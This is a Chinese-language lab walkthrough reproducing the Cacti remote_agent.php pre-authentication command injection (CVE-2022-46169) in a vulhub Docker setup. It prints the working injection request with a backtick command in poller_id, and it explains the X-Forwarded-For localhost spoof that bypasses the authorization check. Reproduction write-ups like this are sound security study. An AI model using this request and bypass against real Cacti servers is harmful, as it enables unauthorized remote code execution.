# 准备工作

1. 漏洞环境[vulhub/cacti/CVE-2022-46169 at master · vulhub/vulhub · GitHub](https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169)

2. Cacti remote_agent.php 预授权命令注入 (CVE-2022-46169) --- 版本范围在1.2.17-1.2.22版本   

3. 或者你自行选择版本下载。下载链接：https://github.com/Cacti/cacti/tags

4. 在进行这个漏洞复现时，使用的环境是ubuntu + docker

5. 检查你的docker环境是否开启（没有docker自己下载)![image-20250725173716780](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725173716780.png)

6. 从docker进行拉取（不行就走代理proxychains）![image-20250725173753554](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725173753554.png)

7. 拉去完成后解压，进入到漏洞这个文件目录下，启动cacti服务![image-20250725174213554](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725174213554.png)

8. 然后使用你本地的浏览器进行访问。

   > 网址为http://172.25.254.110:8080/install/install.php(这是我的网址)

9. 至此环境搭建ok

## cacti步骤

1. 环境配置正确，你进行访问会有一个登陆页面![22622d6bb36a0ebf4bd247e7fd15de9](D:\ruanjian\wechat\WeChat Files\wxid_y46d6cp7ylgp22\FileStorage\Temp\22622d6bb36a0ebf4bd247e7fd15de9.png)

   

2. 登陆进去之后会有一个安装向导![image-20250725182017080](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725182017080.png)

   

3. 下一页![image-20250725182059654](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725182059654.png)

4. 一直点击下一步，知道确认安装页面

   ![image-20250725182607821](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725182607821.png)

5. 安装好之后如下图：

   ![image-20250725185108532](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725185108532.png)

6. 这个漏洞的利用Cacti应用中至少存在需要一个类似的`POLLER_ACTION_SCRIPT_PHP`采集器。所以，我们在Cacti后台首页创建一个新的图：

   ![image-20250725185221937](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725185221937.png)

7. 选择的图表类型是“Device - Uptime”，点击创建：

   ![image-20250725185307331](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725185307331.png)

   ![image-20250725185339316](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725185339316.png)

8. 至此环境搭建成功

## 复现

1. 首先得绕过这个鉴权函数，在remote_agent.php这个代码中

   ```
   if (!remote_client_authorized()) {
   	print 'FATAL: You are not authorized to use this service';
   	exit;
   }
   ```

   

2. 他在这串代码中执行了3个函数，因此要传入三个值

   ```
   function poll_for_data() {
   	global $config;
   
   	$local_data_ids = get_nfilter_request_var('local_data_ids');
   	$host_id        = get_f ilter_request_var('host_id');
   	$poller_id      = get_nfilter_request_var('poller_id');
   	
   传入的值：GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success` HTTP/1.1 
   为什么要执行一个id命令？是因为他的执行没有回显
   
   ```

   然后就分析代码

3. **$_server** 

   是一个全局得数组，它可以获取得值很多，他其中有一部分就是我们所需要的请求头。相当于获取到的使request header中的数据，但是说白了，这些数据可以进行伪造

4. 在你创建了一个数据库时，我们在ubuntu环境下进行查看，

   ![image-20250725201128436](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725201128436.png)

   - [ ] 可以发现，数据库此时已经启动，并且在这个文件下

   ```
   执行这串代码
   root@wxy-ubuntu:/tmp# docker exec -it 18abe7981ede_cve-2022-46169-db-1 /bin/bash
   
   bash-4.2# mysql -uroot -proot（账号密码都是root）
   ```

   ![image-20250725201705069](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725201705069.png)

   - [ ] 然后查看此数据库的信息

     ```mysql
     show databases;
     ```

     有以下数据库![image-20250725201811086](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725201811086.png)

5. 然后进入到cacti这个数据库中，并查看他的表名

   ```mysql
   mysql> use cacti;
   
   mysql> show tables;
   
   ```

6. 这里面的表太多了，我们要查看remote_agent.php这个表中的信息。（经过代码审计之后，我们先查询一下poller_item这个表的内容）

7. 查询之后，有六条数据，

   ![image-20250725202336727](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725202336727.png)

   继续结合代码分析可知，你只有第六条数据他的action是2，其余数据是1，这个才是正确的。hostid都一样，都是1。

   ```
   他的这个local_data_i 这个数据必须是6，因为是6，他的action才会是2
   
   然后在经过循环，把每一条代码的值都拿出来，取了一个action出来（只有6是2，剩下的都是1），取出之后，判断action的值为几。（现在我们的action必须是2，因为不是2，没办法执行下一个命令）因为他的payload是这样写的，（local_data_ids[0]=6&host_id=1），所以说自然就把第六条查出来了，这就是为什么取第六条数据的原因！
   
   
   如果不写数组$local_data_ids情况下，这里就循环不了。因此这里在提交payload就提交了一个local_data_ids[0]=6的数组（正常情况是不用提交数组的，因为现在是白盒，我知道他这里循环了一个数组）
   ```

   

8. 为什么payload可以传递`touch+/tmp/success`。

   - [ ] 因为他后端代码只是接收了这个值，并没有进行过滤

9. 然后取vs中ssh连接这个环境调试

10. 然后打开你本机的代理，打开抓包工具，让其抓到这个登陆页面的包。添加X-FORWARD-FOR:127.0.0.1

    ![image-20250725213330523](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725213330523.png)

11. 现在是走到remote_client_authorized这个函数中,

    把这个函数中断掉，看打印的值是多少，是不是localhost，如果是，后面代码经过分析之后，就可以绕过。

    ![image-20250725213641560](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725213641560.png)

12. 打印值如下：

    ![image-20250725213959761](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725213959761.png)

13. 然后在继续抓poll_for_data()这个函数下的代码返回值，这个命令到底有没有被过滤

    ![image-20250725215903171](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725215903171.png)

    结果可知没有进行过滤，被返回回来了

    ![image-20250725220014061](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220014061.png)

    

14. 看看这个数字到底有没有被过滤

    ![image-20250725220105265](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220105265.png)

    可以看出1返回，没有被过滤

    ![image-20250725220147437](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220147437.png)

    1看一下函数是否走到这，有1走到这里

    ![image-20250725220250413](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220250413.png)

    ![image-20250725220321579](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220321579.png)

15. 经过调试分析之后，所有的东西都在意料之中。

    然后进行payload的构造转换，进行注入数据

    ![image-20250725220610472](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220610472.png)

16. 将所得到的值，进行解密

    ![image-20250725220633332](C:\Users\29151\AppData\Roaming\Typora\typora-user-images\image-20250725220633332.png)

17. 最终这个值被回显出来